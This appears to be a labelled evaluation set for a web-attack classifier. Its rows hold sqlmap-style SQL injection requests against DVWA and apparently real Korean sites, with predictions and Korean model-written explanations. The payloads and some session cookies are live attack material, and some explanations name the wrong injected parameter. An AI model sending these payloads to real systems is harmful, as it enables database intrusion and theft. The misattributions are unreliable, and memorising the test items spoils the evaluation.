Unnamed: 0,payload,label,code,CVE,cluster,pred,correct,result
20566,"/dvwa/instructions.php?doc=PDF%27%3B%27%20AND%208921%3DCAST%28%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288921%3D8921%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27TWUo%27%3D%27TWUo sqlmap/1.5.1.40#dev (http://sqlmap.org) PHPSESSID=ma5430vuuvr6ltjm8okkrh5p49,",1,SI,,16,1,True,"주어진 페이로드를 분석해보겠습니다.

주어진 페이로드는 SQL Injection 공격을 시도하는 것으로 보입니다. 이 페이로드는 DVWA (Damn Vulnerable Web Application)의 instructions.php 페이지에 대한 SQL Injection을 시도하고 있습니다. 페이로드는 SQLMap을 사용하여 공격을 수행하고 있음을 나타내고 있습니다.

공격 여부(0:비공격, 1:공격) : 1 (공격)
공격 구문 : SQL Injection 공격 페이로드
공격 유형 : SQL Injection은 사용자 입력을 통해 악의적인 SQL 쿼리를 실행하여 데이터베이스를 조작하거나 민감한 정보를 노출시키는 공격입니다.
"
9525,"GET /notice/Notice/notice_view/?f_content_num=382&search_key=&search_val=&per_page=-3675%29%20UNION%20ALL%20SELECT%2080%2C80%2C80%2C80%2C80%2CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28103%29%7C%7CCHR%28101%29%7C%7CCHR%28100%29%7C%7CCHR%28114%29%7C%7CCHR%28104%29%7C%7CCHR%2868%29%7C%7CCHR%28121%29%7C%7CCHR%2888%29%7C%7CCHR%28102%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%2C80%2C80%2C80%2C80%2C80%2C80%20FROM%20DUAL--%20- HTTP/1.1\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nHost: isrc.or.kr\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.358.0 Safari/533.3\r\nAccept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7\r\nConnection: close\r\nPragma: no-cache\r\nCache-Control: no-cache,no-store",1,SI,,16,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : UNION ALL SELECT
공격 유형 : SQL Injection
이유 : GET 요청의 URL에서 UNION ALL SELECT 구문을 사용하여 데이터베이스에 대한 SQL Injection 공격을 시도하고 있습니다. 이를 통해 데이터베이스에 악의적인 쿼리를 주입할 수 있으며, 민감한 정보를 노출시키거나 데이터베이스를 손상시킬 수 있습니다."
14339,"GET /notice/Notice/notice_view/?f_content_num=382&search_key=-6209%20UNION%20ALL%20SELECT%2080%2C80%2C80%2C80%2C80%2C80%2C80%2C80%2C80%2C80%2CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28101%29%7C%7CCHR%2883%29%7C%7CCHR%28116%29%7C%7CCHR%28120%29%7C%7CCHR%28103%29%7C%7CCHR%2887%29%7C%7CCHR%2889%29%7C%7CCHR%28121%29%7C%7CCHR%2872%29%7C%7CCHR%28119%29%7C%7CCHR%2877%29%7C%7CCHR%28101%29%7C%7CCHR%28118%29%7C%7CCHR%28110%29%7C%7CCHR%28116%29%7C%7CCHR%28121%29%7C%7CCHR%2890%29%7C%7CCHR%2877%29%7C%7CCHR%28102%29%7C%7CCHR%2867%29%7C%7CCHR%28112%29%7C%7CCHR%2878%29%7C%7CCHR%2878%29%7C%7CCHR%2887%29%7C%7CCHR%2883%29%7C%7CCHR%2897%29%7C%7CCHR%2878%29%7C%7CCHR%28112%29%7C%7CCHR%28103%29%7C%7CCHR%28104%29%7C%7CCHR%28120%29%7C%7CCHR%2865%29%7C%7CCHR%2881%29%7C%7CCHR%2890%29%7C%7CCHR%2898%29%7C%7CCHR%2881%29%7C%7CCHR%2888%29%7C%7CCHR%2884%29%7C%7CCHR%2866%29%7C%7CCHR%2866%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%2C80%20FROM%20DUAL--%20-&search_val=&per_page= HTTP/1.1\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nHost: isrc.or.kr\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.358.0 Safari/533.3\r\nAccept-Charse",1,SI,,16,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : UNION ALL SELECT
공격 유형 : SQL Injection
해당 Payload는 SQL Injection 공격을 시도하는 것으로 판단됩니다. SQL Injection은 웹 응용 프로그램의 보안 취약점을 이용하여 악의적인 SQL 쿼리를 실행하는 공격 방법입니다. 이를 통해 데이터베이스에 민감한 정보에 접근하거나 데이터베이스를 조작할 수 있습니다."
18004,"GET /notice/Notice/notice_view/?f_content_num=382&search_key=&search_val=&per_page=%27%20UNION%20ALL%20SELECT%2080%2C80%2C80%2CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2884%29%7C%7CCHR%28109%29%7C%7CCHR%28110%29%7C%7CCHR%28113%29%7C%7CCHR%2875%29%7C%7CCHR%2884%29%7C%7CCHR%28115%29%7C%7CCHR%2898%29%7C%7CCHR%2883%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%2C80%2C80%2C80%2C80%2C80%2C80%2C80%2C80%20FROM%20DUAL--%20- HTTP/1.1\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nHost: isrc.or.kr\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.358.0 Safari/533.3\r\nAccept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7\r\nConnection: close\r\nPragma: no-cache\r\nCache-Control: no-cache,no-store",1,SI,,16,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : UNION ALL SELECT
공격 유형 : SQL Injection
이유 : GET 요청의 URL에 UNION ALL SELECT 구문이 포함되어 있고, 이는 SQL Injection 공격의 일종으로 데이터베이스에 악의적인 쿼리를 삽입하여 정보를 탈취하거나 조작할 수 있는 공격입니다."
2842,"GET /notice/Notice/notice_view/?f_content_num=382&search_key=&search_val=%20UNION%20ALL%20SELECT%2080%2C80%2CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2881%29%7C%7CCHR%2871%29%7C%7CCHR%2868%29%7C%7CCHR%28103%29%7C%7CCHR%28122%29%7C%7CCHR%2865%29%7C%7CCHR%28112%29%7C%7CCHR%28121%29%7C%7CCHR%2879%29%7C%7CCHR%2899%29%7C%7CCHR%28100%29%7C%7CCHR%2880%29%7C%7CCHR%2876%29%7C%7CCHR%28102%29%7C%7CCHR%28114%29%7C%7CCHR%28111%29%7C%7CCHR%2890%29%7C%7CCHR%2877%29%7C%7CCHR%2887%29%7C%7CCHR%28109%29%7C%7CCHR%2870%29%7C%7CCHR%28115%29%7C%7CCHR%28118%29%7C%7CCHR%28103%29%7C%7CCHR%28113%29%7C%7CCHR%2867%29%7C%7CCHR%2885%29%7C%7CCHR%2878%29%7C%7CCHR%28119%29%7C%7CCHR%28109%29%7C%7CCHR%2867%29%7C%7CCHR%28101%29%7C%7CCHR%28110%29%7C%7CCHR%2873%29%7C%7CCHR%2887%29%7C%7CCHR%2873%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28103%29%7C%7CCHR%28108%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%2C80%2C80%2C80%2C80%2C80%2C80%2C80%2C80%2C80%20FROM%20DUAL--%20-&per_page= HTTP/1.1\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nHost: isrc.or.kr\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.358.0 Safari/533.3\r\nAccept-Charset",1,SI,,16,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : UNION-based SQL Injection
공격 유형 : GET 요청 중 Notice/notice_view 페이지에 UNION 연산자를 이용한 SQL Injection이 포함되어 있습니다. 이를 통해 데이터베이스에 악의적인 SQL 쿼리를 삽입하고 실행할 수 있습니다. 이러한 공격은 시스템의 민감한 정보를 노출시키거나 데이터베이스를 손상시킬 수 있습니다."
31985,"GET /home/play/play_view.jsp?seq=29009&langSession=E'%20and%20utl_inaddr.get_host_address((chr(126)%7c%7cchr(65)%7c%7cchr(57)%7c%7cchr(54)%7c%7cchr(49)%7c%7cchr(53)%7c%7cchr(67)%7c%7cchr(55)%7c%7cchr(56)%7c%7cchr(52)%7c%7cchr(51)%7c%7cchr(48)%7c%7cchr(68)%7c%7cchr(126)))%20and%20'1'='1 HTTP/1.1Accept: Text/Html,Application/Xhtml Xml,Application/Xml;Q=0.9,*/*;Q=0.8Connection: keep-aliveUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; X64; Rv:85.0) Gecko/20100101 Firefox/85.0Accept-Language: en-us,en;q=0.5Accept-Encoding: gzipCookie: JSESSIONID=6JquVa9O0AZDnlXVBTf01qRn9jmdaLCi2PQ5cHPPQQnIGjSo7ZCRpslBfxxF9Vs6.ticketapp2_servlet_engine13Host: www.sacticket.co.kr",1,SI,,16,1,True,"공격 여부(0:비공격, 1:공격) : 1

공격 구문 : GET /home/play/play_view.jsp?seq=29009&langSession=E'%20and%20utl_inaddr.get_host_address((chr(126)%7c%7cchr(65)%7c%7cchr(57)%7c%7cchr(54)%7c%7cchr(49)%7c%7cchr(53)%7c%7cchr(67)%7c%7cchr(55)%7c%7cchr(56)%7c%7cchr(52)%7c%7cchr(51)%7c%7cchr(48)%7c%7cchr(68)%7c%7cchr(126)))%20and%20'1'='1 HTTP/1.1

공격 유형 : SQL Injection 공격
이유 : URL 파라미터인 langSession에 SQL Injection 취약점이 존재하며, 이를 이용하여 데이터베이스에 악의적인 SQL 쿼리를 주입하려고 시도함."
28423,"GET /notice/Notice/notice_view/?f_content_num=382&search_key=&search_val=%29%20UNION%20ALL%20SELECT%2080%2CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28105%29%7C%7CCHR%2882%29%7C%7CCHR%2876%29%7C%7CCHR%28111%29%7C%7CCHR%2888%29%7C%7CCHR%28102%29%7C%7CCHR%2871%29%7C%7CCHR%2873%29%7C%7CCHR%2874%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%2C80%2C80%2C80%2C80%2C80%2C80%2C80%2C80%2C80%2C80%20FROM%20DUAL--%20-&per_page= HTTP/1.1\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nHost: isrc.or.kr\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.358.0 Safari/533.3\r\nAccept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7\r\nConnection: close\r\nPragma: no-cache\r\nCache-Control: no-cache,no-store",1,SI,,16,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : UNION ALL SELECT
공격 유형 : SQL Injection (SQL 삽입)
이유 : GET 요청의 URL에 SQL Injection 공격을 시도하는 부분이 포함되어 있습니다. UNION ALL SELECT 구문은 SQL Injection에 많이 사용되는 키워드로, 공격자는 데이터베이스에 악의적인 쿼리를 삽입하여 데이터를 노출하거나 조작하는 시도를 할 수 있습니다."
17669,"GET /notice/Notice/notice_view/?f_content_num=382&search_key=%29%20UNION%20ALL%20SELECT%2080%2C80%2C80%2C80%2C80%2CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28104%29%7C%7CCHR%2886%29%7C%7CCHR%2875%29%7C%7CCHR%28117%29%7C%7CCHR%2865%29%7C%7CCHR%28104%29%7C%7CCHR%28117%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%2C80%2C80%2C80%2C80%2C80%2C80%20FROM%20DUAL--%20-&search_val=&per_page= HTTP/1.1\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nHost: isrc.or.kr\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.358.0 Safari/533.3\r\nAccept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7\r\nConnection: close\r\nPragma: no-cache\r\nCache-Control: no-cache,no-store",1,SI,,16,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : UNION ALL SELECT
공격 유형 : SQL Injection
이유 : GET 요청의 f_content_num 파라미터에 SQL Injection 공격 코드가 포함되어 있습니다. 이를 통해 데이터베이스에 악의적인 쿼리를 주입하여 정보를 노출시키거나 데이터를 조작할 수 있습니다."
3575,"GET /notice/Notice/notice_view/?f_content_num=382&search_key=&search_val=%29%20UNION%20ALL%20SELECT%2080%2C80%2CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2886%29%7C%7CCHR%2889%29%7C%7CCHR%2866%29%7C%7CCHR%28113%29%7C%7CCHR%28116%29%7C%7CCHR%2875%29%7C%7CCHR%2877%29%7C%7CCHR%28103%29%7C%7CCHR%28114%29%7C%7CCHR%28115%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%2C80%2C80%2C80%2C80%2C80%2C80%2C80%2C80%2C80%20FROM%20DUAL--%20-&per_page= HTTP/1.1\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nHost: isrc.or.kr\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.358.0 Safari/533.3\r\nAccept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7\r\nConnection: close\r\nPragma: no-cache\r\nCache-Control: no-cache,no-store",1,SI,,16,1,True,"공격 여부(0:비공격, 1:공격) : 1

공격 구문 : GET /notice/Notice/notice_view/?f_content_num=382&search_key=&search_val=%29%20UNION%20ALL%20SELECT%2080%2C80%2CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2886%29%7C%7CCHR%2889%29%7C%7CCHR%2866%29%7C%7CCHR%28113%29%7C%7CCHR%28116%29%7C%7CCHR%2875%29%7C%7CCHR%2877%29%7C%7CCHR%28103%29%7C%7CCHR%28114%29%7C%7CCHR%28115%29%7C%7CCHR%28113%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%2C80%2C80%2C80%2C80%2C80%2C80%2C80%2C80%2C80%20FROM%20DUAL--%20-&per_page= HTTP/1.1

공격 유형 : SQL Injection (SQL 인젝션) 공격으로 보입니다. 이 공격은 쿼리문에 악의적인 SQL 코드를 삽입하여 데이터베이스를 비정상적으로 조작하는 공격입니다. 이 경우, UNION ALL SELECT 구문을 이용하여 데이터베이스의 내용을 노출시키는 시도가 있었습니다."
19916,"GET /notice/Notice/notice_view/?f_content_num=382&search_key=-9292%27%29%20UNION%20ALL%20SELECT%2080%2C80%2C80%2C80%2C80%2C80%2C80%2CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28119%29%7C%7CCHR%2870%29%7C%7CCHR%2876%29%7C%7CCHR%28114%29%7C%7CCHR%2886%29%7C%7CCHR%2879%29%7C%7CCHR%2875%29%7C%7CCHR%28111%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%2C80%2C80%2C80%2C80%20FROM%20DUAL--%20-&search_val=&per_page= HTTP/1.1\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nHost: isrc.or.kr\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.358.0 Safari/533.3\r\nAccept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7\r\nConnection: close\r\nPragma: no-cache\r\nCache-Control: no-cache,no-store",1,SI,,16,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : UNION ALL SELECT
공격 유형 : SQL Injection
이유 : GET 요청의 URL에 UNION ALL SELECT 구문이 포함되어 있어 SQL Injection 공격을 시도하고 있음. UNION ALL SELECT는 데이터베이스에 쿼리를 주입하여 민감한 정보를 노출시키는 공격 방법 중 하나이다."
3210,"GET /notice/Notice/notice_view/?f_content_num=382&search_key=&search_val=%25%27%20UNION%20ALL%20SELECT%2080%2C80%2C80%2C80%2CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2887%29%7C%7CCHR%2877%29%7C%7CCHR%28106%29%7C%7CCHR%28108%29%7C%7CCHR%2890%29%7C%7CCHR%28122%29%7C%7CCHR%2867%29%7C%7CCHR%28102%29%7C%7CCHR%2882%29%7C%7CCHR%2889%29%7C%7CCHR%2890%29%7C%7CCHR%28103%29%7C%7CCHR%2889%29%7C%7CCHR%2865%29%7C%7CCHR%2886%29%7C%7CCHR%28110%29%7C%7CCHR%2889%29%7C%7CCHR%28101%29%7C%7CCHR%2884%29%7C%7CCHR%2873%29%7C%7CCHR%28109%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28111%29%7C%7CCHR%2865%29%7C%7CCHR%28117%29%7C%7CCHR%28122%29%7C%7CCHR%28116%29%7C%7CCHR%28100%29%7C%7CCHR%2873%29%7C%7CCHR%28113%29%7C%7CCHR%2878%29%7C%7CCHR%2875%29%7C%7CCHR%28121%29%7C%7CCHR%2872%29%7C%7CCHR%2889%29%7C%7CCHR%2899%29%7C%7CCHR%2897%29%7C%7CCHR%2897%29%7C%7CCHR%2873%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%2C80%2C80%2C80%2C80%2C80%2C80%2C80%20FROM%20DUAL--%20-&per_page= HTTP/1.1\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nHost: isrc.or.kr\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.358.0 Safari/533.3\r\nAccept-Charse",1,SI,,16,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : UNION SELECT
공격 유형 : SQL Injection
이유 : GET 요청의 URL에서 UNION SELECT 구문이 발견되었으며, 이는 SQL Injection 공격의 일종으로 공격자가 데이터베이스에 악의적인 쿼리를 삽입해 민감한 정보를 노출시키거나 데이터베이스를 조작할 수 있는 보안 취약점을 이용한 공격입니다."
34121,"GET /notice/Notice/notice_view/?f_content_num=382&search_key=&search_val=%27%20UNION%20ALL%20SELECT%2080%2C80%2C80%2C80%2C80%2C80%2C80%2C80%2C80%2C80%2C80%2CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2883%29%7C%7CCHR%2887%29%7C%7CCHR%28112%29%7C%7CCHR%2872%29%7C%7CCHR%2882%29%7C%7CCHR%2866%29%7C%7CCHR%2868%29%7C%7CCHR%28117%29%7C%7CCHR%28119%29%7C%7CCHR%28101%29%7C%7CCHR%28105%29%7C%7CCHR%2881%29%7C%7CCHR%2878%29%7C%7CCHR%2871%29%7C%7CCHR%2886%29%7C%7CCHR%2872%29%7C%7CCHR%2874%29%7C%7CCHR%2867%29%7C%7CCHR%28109%29%7C%7CCHR%28116%29%7C%7CCHR%2886%29%7C%7CCHR%2871%29%7C%7CCHR%2883%29%7C%7CCHR%28107%29%7C%7CCHR%2888%29%7C%7CCHR%28117%29%7C%7CCHR%2876%29%7C%7CCHR%28119%29%7C%7CCHR%28120%29%7C%7CCHR%2889%29%7C%7CCHR%2866%29%7C%7CCHR%2897%29%7C%7CCHR%28103%29%7C%7CCHR%28106%29%7C%7CCHR%2897%29%7C%7CCHR%28122%29%7C%7CCHR%28110%29%7C%7CCHR%2871%29%7C%7CCHR%2898%29%7C%7CCHR%28116%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%20FROM%20DUAL--%20-&per_page= HTTP/1.1\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nHost: isrc.or.kr\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.358.0 Safari/533.3\r\nAccept-Charset:",1,SI,,16,1,True,"고객님의 제공한 페이로드를 분석한 결과, 이는 SQL Injection 공격으로 판단됩니다.

공격 여부(0:비공격, 1:공격) : 1 (공격)
공격 구문 : UNION ALL SELECT 문을 이용한 SQL Injection 공격
공격 유형 : SQL Injection
이유 : 페이로드에 UNION ALL SELECT 구문이 포함되어 있어, 데이터베이스에 악의적인 쿼리를 삽입하고 있습니다. 이는 데이터베이스에 저장된 정보를 노출하거나 조작하는 등의 공격을 시도할 수 있습니다. 따라서 이 페이로드는 공격으로 분류됩니다."
16684,"GET /notice/Notice/notice_view/?f_content_num=382&search_key=&search_val=&per_page=%25%27%20UNION%20ALL%20SELECT%2080%2CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2870%29%7C%7CCHR%2867%29%7C%7CCHR%2876%29%7C%7CCHR%2881%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28119%29%7C%7CCHR%28112%29%7C%7CCHR%2879%29%7C%7CCHR%2881%29%7C%7CCHR%28110%29%7C%7CCHR%2874%29%7C%7CCHR%28102%29%7C%7CCHR%2886%29%7C%7CCHR%2899%29%7C%7CCHR%2871%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%2882%29%7C%7CCHR%2885%29%7C%7CCHR%2877%29%7C%7CCHR%2889%29%7C%7CCHR%2879%29%7C%7CCHR%2886%29%7C%7CCHR%2867%29%7C%7CCHR%2887%29%7C%7CCHR%2873%29%7C%7CCHR%28108%29%7C%7CCHR%2888%29%7C%7CCHR%2883%29%7C%7CCHR%2866%29%7C%7CCHR%2899%29%7C%7CCHR%28111%29%7C%7CCHR%28104%29%7C%7CCHR%28112%29%7C%7CCHR%2874%29%7C%7CCHR%28112%29%7C%7CCHR%28109%29%7C%7CCHR%2899%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%2C80%2C80%2C80%2C80%2C80%2C80%2C80%2C80%2C80%2C80%20FROM%20DUAL--%20- HTTP/1.1\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nHost: isrc.or.kr\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.358.0 Safari/533.3\r\nAccept-Charset:",1,SI,,16,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : UNION ALL SELECT
공격 유형 : SQL Injection
이유 : GET 요청의 URL에 SQL Injection 공격을 시도하는 UNION ALL SELECT 구문이 포함되어 있습니다. 이를 통해 데이터베이스에 악의적인 쿼리를 삽입하여 데이터 노출 및 데이터베이스 손상을 시도할 수 있습니다."
